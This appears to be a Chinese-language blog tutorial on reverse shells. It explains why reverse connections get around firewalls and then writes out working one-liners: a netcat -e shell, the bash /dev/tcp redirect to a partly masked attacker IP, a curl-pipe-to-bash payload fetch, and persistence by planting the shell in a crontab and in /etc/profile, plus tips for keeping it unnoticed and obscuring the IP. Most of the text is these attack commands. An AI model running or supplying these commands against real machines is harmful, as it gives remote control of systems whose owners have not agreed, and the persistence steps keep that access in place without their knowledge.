# 简介

反弹shell即攻击机开启某个tcp/udp端口为服务端,让目标机主动发起请求到攻击机监听的端口.

并将其命令行的输出转到攻击机上

## 与正向连接的区别

正向连接,类似远程桌面,ssh,telnet,web服务等,是攻击者用攻击机连接目标机器端口

而当正向连接受限时,比如:

- 目标机被防火墙保护,只能发送请求,不能接受请求.
- 目标机端口被占用
- 目标机位于局域网,或ip动态,攻击机无法直接连接
- 对于对方信息未知

所以反向连接是要目标机主动连接攻击机服务端

# 几种反弹shell的方法

## netcat

netcat是一个容易被其他程序所启用的后台操作工具,同时也被用作网络测试工具或黑客工具.

默认linux发行版中netcat的-e参数被阉割了,如果需要做实验需要先安装原生netcat

安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。

攻击机开启本地监听：

```php
netcat -lvvp 2333
```

目标机主动连接攻击机：

```php
netcat xxx.xxx.xxx.xxx 2333 -e /bin/bash
# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
```



## bash

个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：

```php
bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1或bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"
# bash -i >& /dev/tcp/攻击机IP/攻击机端口
```

解读:

- bash -i   产生一个bash交互环境
- &将联合符号前面的内容与后面结合,一起重定向给后面的
- /dev/tcp/xxx.xxx.xxx.xxx/2333 让机器与攻击机2333端口建立tcp连接
- 0>&1 将标准输入与标准输出内容相结合,重定向给前面标准输出的内容

一句话概括:

Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。

攻击机开启本地监听：

```php
nc -lvvp 2333
```

目标机主动连接攻击机：

```php
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```



### 利用curl与bash配合

先在攻击者web目录下创建一个index文件,例如index.php或者index.html

然后在这个文件里写入:

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```

并开启攻击机2333端口,然后在目标机上访问该index网页,并把其内容作为输入给bash

```
curl xxx.xxx.xxx.xxx|bash
```

注意,上面的ip可以是二进制,八进制,十六进制多种形式



### 将反弹shell的命令写入定时任务

  我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/ 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)

```php
*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/47.xxx.xxx.72/2333 0>&1#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell
```

### 将反弹shell的命令写入/etc/profile文件

 将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。

```php
/bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &# 最后面那个&为的是防止管理员无法输入命令
```